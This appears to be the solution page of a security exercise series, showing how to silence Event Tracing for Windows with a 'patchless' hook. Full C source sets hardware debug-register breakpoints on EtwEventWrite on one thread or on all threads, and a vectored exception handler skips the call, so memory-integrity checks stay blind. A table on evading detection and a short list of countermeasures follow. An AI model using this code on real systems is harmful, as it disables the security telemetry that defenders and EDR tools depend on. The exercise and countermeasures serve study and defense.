---
layout: default
title: "Solution 28: Hardware Breakpoint ETW Hook"
---

# Solution 28: Hardware Breakpoint ETW Hook

## The Bypass

Use CPU debug registers (DR0-DR3) and a Vectored Exception Handler (VEH) to intercept `EtwEventWrite` without modifying any code bytes. This is a "patchless" hook that evades all memory integrity checks.

### C Implementation

```c
#include <windows.h>
#include <stdio.h>

static void* g_EtwEventWrite = NULL;

LONG CALLBACK EtwHookHandler(EXCEPTION_POINTERS* ExInfo) {
    if (ExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;
    
    // Check if the breakpoint hit EtwEventWrite
    if (ExInfo->ExceptionRecord->ExceptionAddress != g_EtwEventWrite)
        return EXCEPTION_CONTINUE_SEARCH;
    
    // Skip the function: set return value and jump to return address
#ifdef _WIN64
    // Read return address from [RSP]
    ULONG_PTR retAddr = *(ULONG_PTR*)ExInfo->ContextRecord->Rsp;
    
    // Set RAX = 0 (STATUS_SUCCESS)
    ExInfo->ContextRecord->Rax = 0;
    
    // Set RIP to the return address
    ExInfo->ContextRecord->Rip = retAddr;
    
    // Pop the return address from stack
    ExInfo->ContextRecord->Rsp += sizeof(ULONG_PTR);
#else
    ULONG_PTR retAddr = *(ULONG_PTR*)ExInfo->ContextRecord->Esp;
    ExInfo->ContextRecord->Eax = 0;
    ExInfo->ContextRecord->Eip = retAddr;
    ExInfo->ContextRecord->Esp += sizeof(ULONG_PTR);
#endif
    
    // Re-enable the breakpoint (single-step clears DR7)
    ExInfo->ContextRecord->Dr7 |= 1;  // Re-enable DR0
    
    return EXCEPTION_CONTINUE_EXECUTION;
}

BOOL SetHardwareBreakpoint(void* address) {
    HANDLE hThread = GetCurrentThread();
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    if (!GetThreadContext(hThread, &ctx))
        return FALSE;
    
    // Set DR0 to EtwEventWrite address
    ctx.Dr0 = (DWORD_PTR)address;
    
    // Enable DR0 as an execution breakpoint (local)
    // DR7 bits: L0=1 (local enable DR0), RW0=00 (execute), LEN0=00 (1 byte)
    ctx.Dr7 = (ctx.Dr7 & ~0xF) | 0x1;  // Set L0, clear condition/size
    
    return SetThreadContext(hThread, &ctx);
}

int main() {
    // Resolve EtwEventWrite
    g_EtwEventWrite = GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    
    if (!g_EtwEventWrite) {
        printf("[-] EtwEventWrite not found\n");
        return 1;
    }
    
    printf("[*] EtwEventWrite @ %p\n", g_EtwEventWrite);
    
    // Verify original bytes are intact
    printf("[*] First bytes: %02X %02X %02X (unchanged)\n",
        ((BYTE*)g_EtwEventWrite)[0],
        ((BYTE*)g_EtwEventWrite)[1],
        ((BYTE*)g_EtwEventWrite)[2]);
    
    // Install VEH (first handler = highest priority)
    if (!AddVectoredExceptionHandler(1, EtwHookHandler)) {
        printf("[-] VEH installation failed\n");
        return 1;
    }
    
    // Set hardware breakpoint on EtwEventWrite
    if (!SetHardwareBreakpoint(g_EtwEventWrite)) {
        printf("[-] Hardware breakpoint failed\n");
        return 1;
    }
    
    printf("[+] Hardware breakpoint set on EtwEventWrite\n");
    printf("[+] VEH handler installed\n");
    printf("[+] No bytes modified — Rule 8 memory check passes\n");
    printf("[+] ETW events silently intercepted\n");
    
    // Verify: first bytes still unchanged
    printf("[*] Verify bytes: %02X %02X %02X (same as before)\n",
        ((BYTE*)g_EtwEventWrite)[0],
        ((BYTE*)g_EtwEventWrite)[1],
        ((BYTE*)g_EtwEventWrite)[2]);
    
    return 0;
}
```

### Multi-Thread Variant

Hardware breakpoints are per-thread. For a multi-threaded EDR, you need to set the breakpoint on all threads:

```c
void SetBreakpointAllThreads(void* address) {
    DWORD pid = GetCurrentProcessId();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    
    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            
            HANDLE hThread = OpenThread(
                THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | 
                THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
            
            if (hThread) {
                SuspendThread(hThread);
                
                CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
                GetThreadContext(hThread, &ctx);
                ctx.Dr0 = (DWORD_PTR)address;
                ctx.Dr7 = (ctx.Dr7 & ~0xF) | 0x1;
                SetThreadContext(hThread, &ctx);
                
                ResumeThread(hThread);
                CloseHandle(hThread);
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
}
```

## Why It Works

| Check | Result |
|-------|--------|
| EtwEventWrite bytes | **Unchanged** — no memory modification |
| Trace session | **Running** — session is untouched |
| Provider registration | **Active** — provider still registered |
| Debug registers | **NOT CHECKED** — invisible to Rule 8 |
| VEH list | **NOT CHECKED** — handler is invisible |

Hardware breakpoints operate at the CPU level. When the instruction pointer hits the address in DR0, the CPU raises a `#DB` exception *before* executing the instruction. The VEH intercepts this exception and redirects execution, so `EtwEventWrite` never actually runs.

## Real-World Countermeasures

- **ETW-TI** monitors `NtSetContextThread` — setting debug registers on another process triggers a kernel event
- Periodically scanning debug registers via `GetThreadContext` on the EDR's own threads
- Integrity verification of the VEH chain (checking `LdrpVectorHandlerList`)
- Running ETW provider as PPL (Protected Process Light) — prevents debug register manipulation by non-PPL processes
- Hardware breakpoint detection via timing analysis (DR breakpoints add overhead)

## Further Reading

- [ETW-TI Deep Dive](https://benjitrapp.github.io/defenses/2026-06-19-etw-ti/) — How kernel ETW-TI detects `NtSetContextThread` for debug register manipulation
- [Hell's Gate, Heaven's Gate & Tartarus Gate](https://benjitrapp.github.io/attacks/2026-01-19-hells-heaven-tartarus-gate/) — Related advanced bypass techniques
